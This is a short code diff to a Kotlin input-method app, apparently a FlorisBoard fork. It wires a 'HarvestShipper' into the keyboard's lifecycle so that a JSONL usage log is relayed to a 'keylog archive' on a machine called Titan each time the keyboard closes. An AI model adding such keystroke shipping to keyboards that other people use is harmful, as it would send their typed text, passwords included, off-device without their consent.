@@ -88,7 +88,11 @@ object HarvestManager {
             isInitialized = true
         }
         // Structured JSONL log lives alongside the markdown log
-        harvestFile?.parentFile?.let { HarvestJsonl.init(it) }
+        harvestFile?.parentFile?.let {
+            HarvestJsonl.init(it)
+            // Relay the JSONL to the keylog archive on Titan (tools/keylog_archive).
+            HarvestShipper.init(context, File(it, "usage_harvest.jsonl"))
+        }
     }
 
     /**
@@ -114,6 +118,8 @@ object HarvestManager {
         currentAppContext?.let { flushSession(appContext = it) }
         HarvestV4.finish()
         currentAppContext = null
+        // The keyboard just closed: a natural pause to ship new harvest bytes.
+        HarvestShipper.poke()
     }
 
     fun updateLayout(fingerprint: dev.patrickgold.florisboard.ime.keyboard.geometry.LayoutFingerprint) {
